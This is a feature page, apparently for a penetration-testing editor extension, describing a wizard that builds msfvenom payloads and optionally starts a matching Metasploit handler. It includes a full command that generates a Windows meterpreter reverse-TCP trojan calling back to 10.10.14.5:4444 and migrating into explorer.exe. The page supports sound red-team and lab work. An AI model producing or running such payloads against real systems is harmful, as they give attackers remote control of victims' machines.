# Payload Generation

Interactive MSFVenom payload creation wizard with optional auto-listener.

## Command

```
weapon task: Create msfvenom payload
```

Command ID: `weapon.task.msfvenom_creation`

## Interactive Flow

1. **Select payload type**: `windows/x64/meterpreter/reverse_tcp`, `linux/x64/meterpreter/reverse_tcp`, PHP, Python, Java, etc.
2. **Select output format**: `exe`, `elf`, `psh`, `dll`, `hta-psh`, `raw`, `jsp`, `war`, etc.
3. **Select advanced options** (multi-select):
   - `PrependMigrate=true PrependMigrateProc=explorer.exe`
   - `PrependFork=true`
   - `AutoSystemInfo=false`
4. **Specify output filename**: Default `./trojan`, supports `${workspaceFolder}/payloads/shell`
5. **Start listener?**: Optionally auto-start matching `exploit/multi/handler`

## Generated Command Example

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=10.10.14.5 LPORT=4444 \
  PrependMigrate=true PrependMigrateProc=explorer.exe \
  -o ./trojan.exe -f exe
```

## Configuration

| Setting | Description |
|---------|-------------|
| `weaponized.msf.venom` | MSFVenom executable path |
| `weaponized.lhost` | LHOST for reverse connections |
| `weaponized.lport` | LPORT for reverse connections |

## Key Files

- `src/features/tasks/commands/msfvenom.ts`
- `src/features/tasks/terminals/taskTerminal.ts`
